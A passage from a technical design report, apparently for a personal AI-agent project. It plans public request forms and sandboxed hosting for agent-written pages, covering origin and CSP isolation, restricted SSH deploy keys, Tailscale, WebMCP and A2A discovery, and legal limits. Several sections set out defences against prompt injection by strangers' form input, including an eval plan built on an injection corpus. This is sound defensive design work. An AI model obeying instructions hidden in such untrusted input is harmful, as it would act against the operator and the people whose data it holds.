  so a subdomain is *not* an isolation boundary for cookies.
- **For inactive content**: `nosniff`, `Content-Disposition: attachment`, and
  `Content-Security-Policy: sandbox`, which isolates the response the way a
  separate domain would, via a unique opaque origin.
- **For active content**, the modern Google pattern is one unique subdomain per
  piece of content on a domain in the Public Suffix List, with a static shim
  receiving the content by `postMessage` into a sandboxed iframe. That isolates
  untrusted content from *other untrusted content*, which a single sandbox
  domain does not.
- The acknowledged weakness of sandbox domains is that authentication is hard
  on them precisely *because* they share no cookies with the main origin.

Which is the tension with capability URLs, and it resolves cleanly:

> **The gate and the content live on different origins.** The capability URL is
> checked on the trusted origin, which holds the sharing policy and any
> session. On success it hands back a short-lived, single-use URL on the
> sandbox origin, which serves the bytes under a strict CSP and knows nothing
> about who you are. The sandbox origin performs no authorization, so it needs
> no cookies, so the thing that makes sandbox domains awkward never arises.

📘 On the Public Suffix List, practically: PRIVATE-section entries must come
from the domain owner, registration must extend **more than two years** past
submission, and the process is a volunteer-reviewed pull request that then
ships in browser releases — weeks to months, not days. **Do not block on it.**
A separate registrable domain gets cookie isolation and cross-site status
immediately, which is the part that protects the booking page; the PSL entry
only buys isolation *between* artifacts, which matters when you host content
you did not write.

**Minimum viable origin plan**, three DNS records plus one for notebooks:

| Origin | Serves | Posture |
|---|---|---|
| `example.com` | the gate: capability check, the forms, the booking page | trusted, sessions allowed |
| `example-artifacts.com` | agent-authored HTML, strict CSP, no external subresources, `nosniff` | never authorizes anything |
| `example-compute.com` | `compute`-class bundles only: `wasm-unsafe-eval`, COOP/COEP | never authorizes anything |
| — | everything else | `CSP: sandbox` + `Content-Disposition: attachment` |

### The options, scored against both directions

| Option | Posture | Artifacts | `write` | Origin control | Cost | Ops |
|---|---|---|---|---|---|---|
| **VPS over restricted SSH** | P | yes | yes — your own binary | total: any domain, any header, wildcard subdomains | ~$5/mo + domains | you patch it forever |
| **Cloudflare Workers + D1 + R2** | P | yes | yes — but see the KV trap | total on headers, custom domain free | $0 at this scale | none |
| **Cloudflare Pages (static only)** | P | yes | no | headers via `_headers` | $0 | none |
| **S3 + CloudFront** | P | yes | needs Lambda@Edge | good | pennies | IAM |
| **GitHub Pages** | P | public only | no | no custom headers ⇒ **no CSP** | $0 | none |
| **Netlify** | P | yes (password on paid) | Functions | good | paid for the good bit | none |
| **Cloudflare Tunnel → home** | **T** | yes | yes | total | $0 | a daemon at home |
| **Tailscale Serve** | P-ish | you only | no | n/a | $0 | trivial |

Notes that change the ranking:

- **GitHub Pages cannot set response headers**, so it cannot set the CSP that
  is the entire security model. Right for `docs/`, disqualified for artifacts.
  Do not let "we already have a static host" collapse those two.
- **Cloudflare terminates TLS.** On any Cloudflare-fronted option the edge sees
  the plaintext of every request and response — which for a form collecting
  strangers' names and addresses is a processor relationship, not an incidental
  detail (Part 9). Decide it on purpose.
- **The KV trap.** Workers KV is *eventually consistent*; a write is not
  immediately visible at every edge. Using it for a slot claim means two people
  at two PoPs can both read "free" and both claim. **Use D1 (a real
  transaction) or a Durable Object (a single-threaded owner per slot); never
  KV.** The double-booking problem reappearing as a platform footgun.
- 📰 **Cloudflare free-tier limits, mid-2026** (verify before depending on
  them): Workers 100k requests/day, 10 ms CPU per invocation; Pages 500
  builds/month, unlimited static requests and bandwidth; D1 5 GB, 5M rows read
  and 100k written per day; R2 10 GB-month; KV 1 GB, 100k reads and **1k
  writes** per day. One to three orders of magnitude above one academic's
  traffic. Paid Workers is $5/mo.

### The VPS shape, and the trust direction rule

"We could just ssh into a remote server" is right, and the detail that makes it
right or wrong is **which direction the key points**.

> **Home holds a key that opens the VPS. The VPS holds nothing that opens
> home.** No reverse tunnel, no `authorized_keys` entry at home for the VPS, no
> VPN membership, no callback webhook.

📰 The deploy key is a forced command, and rsync ships the tool for it:

```
command="rrsync -wo /srv/artifacts",restrict ssh-ed25519 AAAA...
```

`-wo` is write-only into that directory and nothing else; `restrict` enables
every restriction openssh has — no pty, agent forwarding, port forwarding, X11
or user rc — **including ones added in future versions**, which is why it beats
enumerating them by hand. A second key with `command="rrsync -ro /srv/queue"`
drains the request queue. Two keys, two directories, two directions, neither
able to run a shell.

The box: nginx (or the service itself) serving `/srv/artifacts` with the CSP in
the *server config* rather than set by whatever wrote the file; one small
binary handling the `write` endpoint against SQLite in WAL mode; systemd;
unattended-upgrades. A CDN in front purely as DNS proxy for TLS, rate limiting
and a challenge on the POST changes none of the above.

The honest cost: a VPS is a machine you patch forever, and the failure mode of
forgetting is not "the site is down", it is "the site is someone else's".
Against that: total header control, wildcard subdomains, no per-request
platform semantics, no vendor reading your plaintext, and a service testable
locally because it is just a program. **If the patching is the dealbreaker,
Workers + D1 + R2 implements all four verbs at $0** — and because the interface
is four verbs, that switch is a day, not a rewrite. That portability is the
reason to name the verbs at all.

### Tailscale answers half the question completely

Worth its own note because it is already installed here, and checking it
changed what it is good for.

`tailscale status` on this box shows a tailnet already spanning the DGX, a
MacBook, an iPhone and one more Linux host, all one identity. So the audience
for "read my agent's output on my phone" is *already authenticated*, with
nothing to set up.

**`tailscale serve <target>` takes a file or a directory, not only a port** —
from the CLI's own help on this machine. That removes a whole component:

```text
tailscale serve --bg ~/.mecha/site     # a directory of static files, over HTTPS
```

No web server, no port, no process to supervise, no firewall rule; the
generator can be a batch job that exits. Serve is tailnet-only, Funnel is the
same mechanism pointed at the internet, and the two are mutually exclusive per
port — which makes "is this public?" a single legible piece of state.

The posture axis is really two questions, and separating them shows where Serve
sits:

| Shape | Stranger can ask | Reaches our code | Public box to lose |
|---|---|---|---|
| `tailscale serve <dir>` | no | **no** — `tailscaled` serves the bytes | none |
| `tailscale serve <port>` → a mecha server | no | yes | none |
| Push–pull to a VPS | yes | no (at home) | yes |
| Tunnel → home | yes | **yes** | none, and that is the problem |

Serving a *directory* is the only row answering **no** to both and needing no
second machine at all. It is strictly the cheapest safe thing on the board —
and it is not on the board for external sharing, because a collaborator at
another institution will not join your tailnet to read a report.

**Solve the two audiences separately and each is easy:**

| | Audience | Strangers? | Needs a public box? | Answer |
|---|---|---|---|---|
| **Personal reading** | my own devices | no | no | `tailscale serve <dir>` |
| **External sharing** | a collaborator, a stranger booking a meeting | yes | yes | the public origin above |

Solve them together and you inherit every constraint of the harder one — a
public origin, a CSP you must set yourself, cookie isolation, capability URLs,
a box to patch — in order to read your own briefing in bed.

**If a server is ever wanted, Tailscale can also supply the identity.** When
Serve proxies to a local service it sets `Tailscale-User-Login`, `-Name` and
`-Profile-Pic` on the request and *strips* those headers from incoming requests
so they cannot be spoofed. An application behind it knows who is asking without
implementing login, sessions, cookies or password reset. The caveat is sharp:
**those headers are trustworthy only if the service listens on loopback
only.** Anything reachable on the LAN or tailnet directly can be called without
going through Serve, and then the caller supplies whatever identity they like.
Bind `127.0.0.1`, refuse anything else without an explicit flag, and treat the
header as authoritative only because of that.

### What a server actually buys

**Reading needs no server.** Yesterday's briefing is a static page.

**A server buys *acting*, and only that.** Releasing an outbox draft from a
phone. Running a trigger now. Disabling one misbehaving at 3am from somewhere
that is not a terminal. Given that the interesting scheduled work — overnight
triage that *stages* replies — is designed for review, approving from a couch
is plausibly the feature that makes the whole 24/7 setup worth running. That is
a real argument for a server, and it is an argument about the outbox rather
than about artifacts.

---

## Part 9 — Discovery, interop, and four constraints that are not engineering

### How another agent finds the front door

**📘 WebMCP is the interesting one, and it is shipping.** A W3C Draft Community
Group Report was published 2026-02-10; Chrome shipped it behind a flag in 146
Canary and enabled it for real traffic by 149. A site registers tools via
`navigator.modelContext` with a name, a description and JSON Schemas for input
and output, and existing HTML forms can be annotated as tools. Large consumer
sites are experimenting.

The consequence is a reframe:

> **You do not need to build a chatbot front door, because your visitors are
> increasingly arriving with their own.** WebMCP lets the requester's agent
> read your typed form as a tool, fill it from a conversation *the requester is
> paying for*, and submit a schema-valid object. The conversational experience
> happens on their side of the boundary; the validation happens on yours; no
> model of yours is on the request path; and the fields are still the fields.

That is the strongest argument for typed schemas over prose intake, and it did
not exist eighteen months ago.

**📘 A2A Agent Card** at `/.well-known/agent-card.json` (earlier
implementations used `/.well-known/agent.json`, so publish both during the
transition). Skills map one-to-one onto request types. The spec's own rule is
exactly right here: **publish only skills safe for unauthenticated discovery**,
and put anything richer behind `GetExtendedAgentCard`. Public: "request a
meeting", "request a letter". Never: your calendar, your availability detail,
your correspondents.

A2A also has **`Artifact` as a first-class Layer 1 object** — an output
generated by an agent, composed of typed `Part`s (`TextPart`, `FilePart`,
`DataPart`). A store whose model is `{id, type, version, created_at, source,
parts[]}` projects onto it trivially; one built around a single markdown blob
does not, and the difference is invisible until something else wants to consume
it. The inbound request is the mirror image of the same shape. Adopting the
**data model** costs nothing; implementing the **protocol** would be building a
bridge to a river nobody here is crossing — nothing in this design delegates a
task.

**📰 MCP: publish is a Tool, artifacts are Resources — and mecha cannot read
Resources.** The field's guidance is consistent: tools are model-controlled
actions, resources are application-controlled file-like data; if it answers a
question it is a Resource, if it does something it is a Tool. The reported
failure mode is defaulting to tools for everything and then discovering
context-window blowups, because a large blob returned from a tool call is spent
tokens where the same bytes as a resource are read once, deliberately.

**Verified in our own source rather than assumed:** `mecha-core/src/mcp.rs`
calls `tools/list` and nothing else, and the `initialize` handshake declares
`"capabilities": {}`. mecha's MCP client is **tools-only** — it cannot list or
read resources from *any* server. Three consequences: exposing artifacts as
resources is a **client** work item before it is a server one; until then the
read-back path for mecha's own artifacts is the workspace, not a protocol; and
resource support is independently worth building, since every third-party
server exposing resources is currently invisible. When it lands, note the
security consequence — a resource's contents are third-party text exactly as a
tool result is, so they must arrive `.from_outside()` and honour the same
`[[mcp]] capabilities` override, or the interlock acquires a blind spot on day
one.

📰 One more surface, deliberately deferred: **MCP Apps** (the first official MCP
extension, announced 2025-11-21, formalised 2026-01-26) lets a server return
`ui://` resources — self-contained HTML rendered by the host in a sandboxed
iframe, with pre-declared templates and auditable JSON-RPC messages. The
in-chat version of the same form, blocked on the same client gap.

**📰 `llms.txt`: do it, expect nothing.** Adoption is around 10% of surveyed
domains after eighteen months, one analysis found 97% of published files
receive zero AI requests, and a modelling test found the variable added noise
rather than signal. Ten minutes. A courtesy, not a channel.

**And the fourth mechanism, which is not new: a plain HTML form.** It works in
every browser, for every screen reader, with no JavaScript, for the visitor who
has no agent at all. It is also the legally safest option. Ship that one first;
the other three are annotations on it.

### ⚖️ Liability: you own what your front door says

*Moffatt v. Air Canada*, 2024 BCCRT 149. A traveller relied on a chatbot's
statement about bereavement fares; the airline argued it was not responsible
for its chatbot's output; the tribunal rejected that squarely — *"It should be
obvious to Air Canada that it is responsible for all the information on its
website. It makes no difference whether the information comes from a static
page or a chatbot"* — and ordered payment. Small damages, large principle, read
consistently since: **a chatbot's misrepresentation is the operator's
misrepresentation.**

Apply that to "ask questions about my research", the request type that most
invites a live model:

- A generated answer under your name about your work, your availability, your
  admissions plans or your willingness to collaborate is **a statement by
  you**. "The AI said it" is not a defence that has ever worked.
- 📄 The citation-hallucination literature makes this concrete: reported figures
  include GPT-4 at 13.4% precision with a 28.6% hallucination rate in one
  systematic-review replication, and up to 70% invented or inaccurate
  references in some AI-generated review articles. Retrieval reduces this and
  does not eliminate it — the residual failure is **citation-shaped
  hallucination**, answers that look grounded because they carry quotes and
  links while the claim itself is unsupported.

The conservative design follows, and it is also the better product:

> **The front door answers from a corpus you approved, or it does not answer.**

Tier 0 for research questions is *retrieval*: a deterministic search over your
published abstracts, an FAQ you wrote, your DOIs, your course pages — returning
**pointers, not prose**. Anything needing a sentence composed for the occasion
is a tier-2 draft in your outbox with your name on it, released by you. Slower
than a chatbot, and the only version that is yours.

📰 The disclosure norm is the other half and is not optional: people are
entitled to know they are talking to a machine. Label it on the page, in the
acknowledgment, and in the Agent Card description.

### ⚖️ FERPA makes the letter form's shape non-negotiable

A recommendation request touches student education records:

- Non-directory information — GPA, grades, performance in a research or
  work-study position — **may not appear in a letter without the student's
  written consent**. Your own personal observations are yours to write.
- The *waiver* of the student's right to read the letter and the *consent* to
  disclose record information are two different things, and conflating them is
  the most common error in this area.

So `ferpa_consent` is a required field, the record carries it, and — the rule
that matters — **the agent is never the thing that decides whether consent
exists.** It reads a boolean a human set. A model inferring consent from prose
is the worst outcome available here.

Second-order and easy to miss: a letter request contains a third party's
personal data, which an agent run will read. Everything downstream is
`private_data` about someone who is not you, and it should not be distilled
into the knowledge graph or a learned rule without deciding that on purpose.
Provenance already gates learning; this is a reason to be glad it does.

### ⚖️ GDPR: no small-scale exemption, and `drain` is the answer

A public form reachable from the EU makes you a controller. There is no size
threshold — the test is whose data you process, not how many staff you have.
The obligations at this scale: a stated legal basis (Art. 6), a transparent
privacy notice, a data processing agreement with any processor (which includes
a CDN or edge platform that sees plaintext), breach notification within 72
hours, and honouring access and deletion requests.

The pleasing part: **posture P's `drain` is already the data-minimisation
story.** The public box holds a submission for minutes and then it is gone; the
durable record lives on your machine, where a deletion request is `rm` and a
ledger entry. Retention becomes `retain_days` in the manifest rather than a
policy nobody implements.

### ⚖️ Accessibility, and the surprising convergence

The DOJ's ADA **Title II** rule requires WCAG 2.1 Level AA for public entities'
web content, headline date 2026-04-24, with 📰 an interim final rule reported in
April 2026 extending larger entities to 2027-04-26. **Title II covers public
universities; Dartmouth is private**, so Title III applies instead — no
codified technical standard, but a heavily litigated "public accommodation"
obligation where WCAG 2.1 AA is the de facto benchmark. Either way the design
target is the same, and a personal page taking requests from students ought to
meet it regardless of which title applies.

Here is the convergence, and it is the most satisfying finding in this
document: **the accessible option and the injection-resistant option are the
same option.** A plain, semantic, server-validated HTML form with real
`<label>`s, keyboard navigation, visible focus, no JavaScript requirement and
no time limit is simultaneously (a) the WCAG-conformant choice, (b) the
Action-Selector pattern, (c) the zero-token path, and (d) the thing WebMCP can
annotate. A conversational chatbot is worse on all four axes at once.

📰 Which is worth stating against the conversion data, because the data is real
and points the other way: conversational forms are reported at 47.3% completion
versus 21.5% for traditional forms across 2.6M Typeform forms, with progressive
disclosure attributed a 30–50% lift. Two reasons not to be moved: the sources
are lead-generation vendors measuring lead generation, and the population is
different — a prospective postdoc writing to a lab they want to join is not an
ambivalent shopper. **Friction is a feature here**; the goal is fewer,
better-formed requests, not more of them. Take the one piece that transfers
cleanly — progressive disclosure, one section at a time, with a visible step
count — and leave the chatbot.

---

## Part 10 — What is actually new here

Being honest about competent assembly versus novelty.

**Assembly** (real, not novel): schema-driven forms, capability URLs, static
hosting, an approval queue, magic links, atomic slot claims.

**Novel, and defensible:**

1. **One manifest, six surfaces, both directions.** The surveyed products each
   pick one — a form builder, a booking page, an artifact host, an MCP server.
   The claim that inbound requests and outbound artifacts are the same typed
   object behind the same review gate is, as far as this search found, not
   something anyone has built.
2. **Structure as the injection defense, with receipts.** "No model on the
   request path" is a rule others state too. Recognising it as the
   Action-Selector pattern, adding *the type is chosen by the form, never
   inferred from prose*, and observing that a schema gets CaMeL's control/data
   separation without CaMeL's 2.7× token cost is a stronger and more defensible
   position than the folk version.
3. **Capacity as a first-class field.** `capacity = 8` per season, enforced
   deterministically, with a dignified auto-decline. No inbox can do this and
   no scheduling product does it either. Three lines of code, and the feature
   most likely to change your actual life.
4. **The visitor's agent is the conversational UI.** WebMCP inverts the
   build-a-chatbot instinct: the pleasant front end runs on the requester's
   side, on the requester's tokens, and hands you a validated object. Shipping
   in Chrome now; nobody in the academic-front-door space is using it.
5. **Content classes as CSP policy, forced by marimo.** That Pyodide needs
   `wasm-unsafe-eval` and cross-origin isolation — and that granting it on the
   artifact origin would weaken every artifact — turns "we might serve
   notebooks someday" from a nice-to-have into a decision that must be made
   before the first domain is registered.
6. **Capability URLs with expiry and per-recipient revocation**, which the W3C
   TAG specified in 2014 and no surveyed artifact host implements.
7. **The state machine, not the AI.** A typed request has a status, an SLA, a
   deadline, a capacity, an audit trail and a ledger. That is the product.

---

## Recommendations

These supersede the `A*`, `H*` and `F*` identifiers in the four source
documents.

### Shape

- **P1. Freeze the interface at four verbs** — `publish`, `read`, `write`,
  `drain` — so the host stays a deployment decision rather than an
  architecture.
- **P2. The unit of extension is a versioned request-type manifest**, emitting
  the schema, the form, both validators, the MCP and WebMCP declarations, the
  A2A skill, the triage frame and the policy. Add a request type by writing one
  file; never by writing a route.
- **P3. Model both stores on A2A's `Artifact`/`Part` shape** — id, type,
  version, time, source, typed parts — inbound and outbound alike. Do not
  implement the A2A *protocol*.
- **P4. Request types and bookable windows live in `~/.mecha/`, never in the
  layered config.** A repo that could declare one has been handed a public form
  on your domain collecting other people's data. Global config only, as trigger
  runs already do.

### Security

- **P5. The type is chosen by the form, never inferred from prose.** No
  free-text router. If one is ever built it *proposes* and something
  deterministic or human confirms. This is the sentence for CLAUDE.md.
- **P6. Every decision expressible as arithmetic is made by arithmetic**, at
  the origin, before any model exists: season, capacity, minimum notice,
  required fields, size caps, the atomic claim. The model's job is judgement
  and prose, never gatekeeping.
- **P7. No model anywhere on the request path**, ever, for anything
  unauthenticated. Nothing to inject into at the moment of typing, and a
  stranger cannot spend your provider budget.
- **P8. Everything a stranger typed is `.from_outside()`** when it enters a
  conversation, and `untrusted` is a per-field label so the enum can be quoted
  while the paragraph is quarantined.
- **P9. `publish` is `external_send` and rides the outbox.** No new safety
  machinery: staging skips the interlock because it sends nothing, the taint
  snapshot rides along, a human releases it.
- **P10. The host sets the CSP and refuses external subresources** — not the
  model, not the template. The documented attack fires in the viewer's browser
  where no interlock reaches.
- **P11. Content classes decide the CSP and therefore the origin.** `static` /
  `interactive` / `compute`, with `compute` on its own origin because
  `wasm-unsafe-eval` must never be granted where plain artifacts live. Vendor
  every asset; fail the publish if a CDN reference survives. `--mode run` for
  anything public.
- **P12. Two registrable domains minimum, not two subdomains.** Cookies do not
  respect subdomain boundaries, and the booking page is the thing being
  protected.
- **P13. The gate is on the trusted origin; the bytes are on the sandbox
  origin.** Capability URL checked one place, short-lived single-use URL issued
  for another. This is what makes capability URLs and origin isolation
  compatible instead of opposed.
- **P14. Capability URLs done properly**: CSPRNG id, expiry, one URL per
  recipient so revocation can be targeted, no secrets in a path that ends up in
  a referrer.
- **P15. Verification gates the token spend.** Unverified submissions expire on
  the public box and are never drained. Magic link, single-use, short expiry,
  one live token per address per type.

### Hosting

- **P16. Posture P, always.** mecha pushes and polls; nothing from the internet
  reaches the home machine. A tunnel is rejected not because it is insecure
  about firewalls but because it delivers stranger-controlled requests to the
  process that shares a box with every credential mecha has.
- **P17. Start on a VPS with two forced-command SSH keys** (`rrsync -wo` up,
  `rrsync -ro` down). Verify the property by reading `authorized_keys`: home→VPS
  write-only, home→VPS read-only, nothing pointing the other way.
- **P18. The `write` endpoint's claim is a transaction.** SQLite or `O_EXCL` on
  a VPS; D1 or a Durable Object on Cloudflare. Never KV.
- **P19. `drain` is a model-free CLI invocation on a trigger.** The common case
  — nothing new — costs zero tokens.
- **P20. Generate a directory; let something else serve it.** `tailscale serve
  <dir>` needs no process, no port and no firewall change, and the tailnet here
  is already the exact audience for personal reading. Every other host consumes
  the same directory, so this forecloses nothing.
- **P21. If a mecha server is ever built: loopback only, identity from the
  proxy.** Bind `127.0.0.1`, refuse anything else without an explicit flag, read
  `Tailscale-User-Login` — trustworthy *because* of the loopback bind and not
  otherwise. No login, no sessions, no cookies.
- **P22. Write a trigger's report into its own workspace, not `~/.mecha`**, so
  any agent jailed there can read it with `fs_read` and no hole is punched in
  the path jail. Record the path on the ledger row.

### Inbound and reply

- **P23. Three tiers, and the acknowledgment is tier 0** — immediate, from the
  origin, from a template with no model output in it.
- **P24. The research-question surface retrieves; it does not generate.**
  Pointers into a corpus you approved; anything composed for the occasion is a
  staged draft. Label the surface as automated everywhere it appears.
- **P25. Batch review in the outbox**, keyed on request type, before the public
  surface ships — grouping, bulk approve/reject, each item shown with its
  context and the agent's reasoning.
- **P26. Structured triage verdicts put reasoning first**, decision fields
  after; field order measurably drives the reasoning penalty.
- **P27. Never negotiate by email.** Send a link that carries the state and can
  expire; nudge about it; stage both.

### Scheduling

- **P28. `calendar_freebusy` on mecha-mail's unified surface** — Google
  `freeBusy.query`, Graph `getSchedule`, fan-out, intervals only, never
  `findMeetingTimes`. Useful the day it lands with no other work.
- **P29. One availability engine, deterministic, no model in it.** Adopt
  RFC 7953's `VAVAILABILITY` semantics as the internal model. UTC plus IANA
  zones, rendered at the edge.
- **P30. Report feasibility, excess cost and fairness separately**, per
  CalBench. A single "did it schedule the meeting" number reads as 100% while
  the agent quietly costs people their afternoons.
- **P31. Try Cal.rs for the one-sided booking page** before building it, keep
  the availability engine in mecha regardless, and never vendor AGPL code into
  an MIT crate.

### Compliance

- **P32. FERPA consent is a field, and the agent never decides it.**
- **P33. Retention is a manifest field**, and `drain`-and-delete is the GDPR
  data-minimisation story. State the legal basis and publish a privacy notice.
- **P34. Plain semantic HTML form, WCAG 2.1 AA, no JS requirement.** The
  accessible, Action-Selector, zero-token and WebMCP-annotatable option, all at
  once. Progressive disclosure is the one thing worth taking from the
  conversational-forms research.

### Discovery

- **P35. Publish the Agent Card with public-safe skills only**, at both
  `/.well-known/agent-card.json` and `/.well-known/agent.json`. Ship `llms.txt`
  and expect nothing from it.
- **P36. Publish is a Tool; artifacts are Resources** — blocked on mecha's own
  MCP client, which speaks `tools/list` and nothing else. Until that changes,
  the read-back path is the workspace (P22), not a protocol.

### Derived from your own data

- **P37. Derive the request types from your mail, not from imagination.** Mine
  twelve months of correspondence for the actual recurring asks, their actual
  fields and their actual seasonality. A schema guessed at is a schema that
  gets bypassed by "other → please describe".

---

## Deliberately not recommended

- **A chatbot front door.** Model on the request path, worst accessibility,
  worst injection posture, and *Moffatt* liability on every sentence. The
  conversational experience belongs on the visitor's side via WebMCP.
- **Inferring the request type from free text.** The single change that
  converts this from an Action-Selector system into an injectable one.
- **Live generative answers about your research.** Retrieval and pointers, or a
  staged draft — not a fluent paragraph composed for a stranger under your name.
- **Auto-publishing, and auto-sending.** Every failure mode in Part 3 begins
  with a page going up or a message going out without a person reading it.
- **Granting `wasm-unsafe-eval` on the artifact origin** to make notebooks
  work. Silently-degrading sandbox, applied to the one enforcement that matters.
- **A server-side notebook runtime on the public box.** It breaks posture P, it
  is a Python process executing code on the internet, and WASM export makes it
  unnecessary.
- **A tunnel into the home machine**, and additionally because a shared
  institutional GPU box is not a place to quietly open public ingress.
- **GitHub Pages for artifacts.** No response headers means no CSP. Fine for
  `docs/`.
- **Workers KV for the slot claim.** Eventually consistent; it will
  double-book, rarely, and the bug report will be a confused email.
- **One origin for both directions.** The only new vulnerability the
  combination creates, and one domain registration avoids it.
- **Letting the public box hold anything that reaches home.** No reverse
  tunnel, no home `authorized_keys` entry, no VPN membership, no callback.
- **An account system.** Verification binds a request to a mailbox; it needs no
  passwords, sessions, resets or user table. Everything that makes
  authentication dangerous to write badly is avoidable here.
- **Attachments resolved, links fetched, addresses used.** A stranger's URL is
  data to display, never a thing an agent with mail access dereferences.
- **Autonomous email negotiation.** x.ai's grave.
- **A2A agent-to-agent handshakes**, and **the institutional-identity tier**.
  Leave the enum value; implement nothing.
- **A docs generator as the artifact engine.** The artifact problem is
  permission and lifecycle; generation is a markdown-to-HTML call and a
  template. Coupling them buys a plugin system nobody needed and a build step
  in the publish path.
- **A second copy of a report as the record.** The session transcript is the
  record; an artifact is a rendering of it, and when they disagree the
  transcript wins — the rule `/triggers` already follows.
- **Viewer analytics.** It means tracking colleagues who opened a report you
  sent them.
- **Custom domains for artifacts, comments, multiplayer editing, a general
  calendar UI.** Real features in the surveyed products, none on the path to
  "my briefing is a page I can send someone."

---

## How to grade it

Everything else in this project is measured, and most of this is deterministic.

- **Unit tests** own the manifest and the engine: one schema validates
  identically in the browser and at the origin (generate both from the same
  file, assert a payload corpus agrees); capacity, season and minimum-notice
  rules; slot intersection, buffers, hold expiry; a bookable window across
  spring-forward *and* the repeated autumn hour, in both directions, following
  `cron.rs`; schema version *N* still parses records written at *N-1*. Almost
  all the correctness lives here and it is free.
- **Integration tests** own the gate and the claim: a publish containing a CDN
  reference fails; a `compute` bundle cannot reach the artifact origin; two
  concurrent claims on one slot produce exactly one winner. Establish that the
  negative is not vacuous — a concurrency test that never actually races passes
  for the wrong reason.
- **Eval cases** own what only emerges with a model: an injection corpus in
  every `untrusted` field of every request type, asserting
  `expect.blocked_sends` **and** asserting the request *type* is unchanged in
  the trace — the second assertion is what grades P5. A trace check that the
  agent called `calendar_freebusy` *before* proposing rather than guessing. A
  CalBench-shaped local scenario with a script-computed optimal slot, graded by
  `expect.verify`.
- **The honest metrics** are *time to first human decision*, *fraction of
  requests that never need you*, and *fraction that arrive well-formed*. Not
  "requests handled" — a front door that processes more requests faster while
  you still read every one has achieved nothing.

---

## The ladder: how much do you actually have to build

**L0 — publish, don't serve.** A trigger regenerates availability and a static
page and pushes it anywhere; a request is a `mailto:` carrying a schema-valid
payload and an opaque token; the existing inbox-triage trigger drains it and
stages the reply. **No server, no inbound, no port, no tunnel, no injection
surface beyond the mail you already read.** Genuinely most of youcanbookme for
one person. What it cannot do: tell the browser "booked!", and close the race
between two people emailing about the same slot — at your volume a rare,
detectable, apologise-by-email event. Worth building even if you intend to go
further, because the engine, the manifest format and the publish step are all
the next rung's components.

**L1 — a real public origin.** The four verbs on a VPS (P17), verification
(P15), the immediate templated acknowledgment (P23), the atomic claim (P18).
This is the first step that creates a box to patch forever; everything before
it is reversible.

**L2 — group scheduling**, tiers 1 and 2, which is the part nobody sells you.

**L3 — content classes and the second and third origins**, when the first
notebook goes out.

### The shortest path from here

1. **Mine your own mail for the real request types** (P37). Read-only, no new
   code, ends with evidence rather than a guess. *An afternoon.*
2. **`calendar_freebusy`** (P28). Useful the day it lands. *Half a day.*
3. **The manifest and its generators**: manifest → JSON Schema → HTML form →
   validators. Pure, unit-tested, no server, no agent, no hosting; renders to a
   file you can open. *Two days, and it is the whole architecture.*
4. **The availability engine** (P29), pure and unit-tested, no interface.
   *Two days.*
5. **One request type end to end at L0** (item 3 above). Proves the loop and
   tells you whether the schema was right. *A day.*
6. **Batch review in the outbox** (P25), which step 5 will have made obvious.
7. **Decide whether you still want a public origin.** Steps 1–6 are free of
   every hard decision in Part 8, and they are where the value is concentrated.

---

## Open questions

Ordered by how much they change the shape of what gets built.

1. **Does this become its own repository?** The reusable value is concentrated
   in the *hosting and the manifest* — origin split, CSP, capability URLs,
   schema generators — and almost none in the *generating*, which is a markdown
   call and a template. The natural split is `mecha-mail`'s: a library, a CLI,
   a thin MCP server, and a deployment. A repository whose valuable half is a
   deployment might be better as a deployment plus fifty lines. Unresolved, and
   it decides whether this is a weekend or a month.
2. **Which audience is served first?** Personal reading and external sharing
   want different substrates. Building the personal half is nearly free and
   forecloses nothing; the sharing half means a public box, extra domains and a
   thing to patch forever. Not the same project, and the order matters.
3. **Does the research-question type exist in v1 at all?** It carries the
   *Moffatt* exposure, its usefulness depends entirely on retrieval quality,
   and a static FAQ page might satisfy it. Deferring it costs nothing and
   removes the largest legal surface.
4. **What is the smallest honest verification tier?** Email round-trip is
   clearly right for letters and lab applications. Is it right for a booking,
   where it doubles the steps between a colleague and a meeting? A per-type
   field says yes-in-principle; whether a real person tolerates it is empirical,
   and L0 answers it.
5. **How does a request become a conversation when it needs to?** Most asks
   resolve in one exchange; some need one follow-up field. The link-not-prose
   rule says the reply should carry a link back into the same typed flow, which
   means resumable partial requests — more machinery than v1 wants, with a
   staged email as the fallback. It decides whether requests are objects or
   threads.
6. **What happens to a request that is neither accepted nor declined?** The
   ledger answers "why didn't that happen" for triggers; the equivalent here is
   an expiry and an honest auto-response. Silence is the failure mode this whole
   project exists to fix, and it is easy to rebuild by accident.
7. **Is `compute` worth an origin on day one**, or is the honest v1 "reports and
   posts only, notebooks later"? The decision must be *made* early even if the
   implementation is deferred, because it constrains how many domains get
   registered.
8. **Does the MCP-resources gap get closed here or on its own?** It is a harness
   question wearing an artifact costume — mecha cannot read resources from any
   server today, and fixing that is worth doing regardless. Doing it here means
   this feature paying for a general capability, which is how general
   capabilities get built and also how features slip.
9. **Which parts of the Claude Code artifact behaviour in Part 6 are actually
   true.** Two sources disagree about the public-link tier and all of it is
   secondary reporting. If any of it becomes load-bearing, check the product.

---

## Appendix — Documentation hosting, a genuinely separate decision

Kept because it came up in the same session and would otherwise be lost, and
separated because it shares a word ("static site") with the rest of this
document and almost nothing else. The hard part of a *documentation* site is
generation — navigation, search, versioning, theming. The hard part of an
*artifact* site is lifecycle — permission, sharing, revocation, and the fact
that the page was written by a language model that had been reading someone
else's email an hour earlier. Picking a documentation generator to solve the
artifact problem would be answering the easy half.

| Generator | Speed / scale | Ecosystem | Best for |
|---|---|---|---|
| **Hugo** (Go) | 10k pages in under a minute | large, Go templates | very large sites; speed above all |
| **Zensical** (Python/Rust) | 4–5× faster incremental than MkDocs | new, migrating from Material | Material for MkDocs users |
| **Astro + Starlight** (JS) | fastest of the JS set, islands | growing fast | new open-source docs |
| **Docusaurus** (React) | degrades past ~1000 pages | largest | React shops; i18n + versioning together |
| **VitePress** (Vue) | fast | Vue-only | Vue projects, and only those |
| **MkDocs Material** (Python) | fine | 60–70% of Python OSS docs | Python projects |
| **Zola** (Rust) | single binary, fast | thin | Rust projects wanting no new runtime |
| **mdBook** (Rust) | fast | Rust-native | Rust project handbooks |

**Zensical is the live story.** From the Material for MkDocs team (announced
2025-11-05, MIT), and it exists because **MkDocs itself has been unmaintained
since August 2024** while Material entered maintenance mode with twelve months
of critical-fix support. It reads an existing `mkdocs.yml`, keeps URLs and
structure, and adds a differential build engine and a new search. The caveat is
current: module and plugin-parity phases are still landing, early access is
gated to paying members, and template overrides need MiniJinja adjustments.
**The right destination for anyone already on Material for MkDocs; a bet on an
unfinished road for anyone who is not.**

For mecha this is a small decision badly worth over-thinking. `docs/` is a
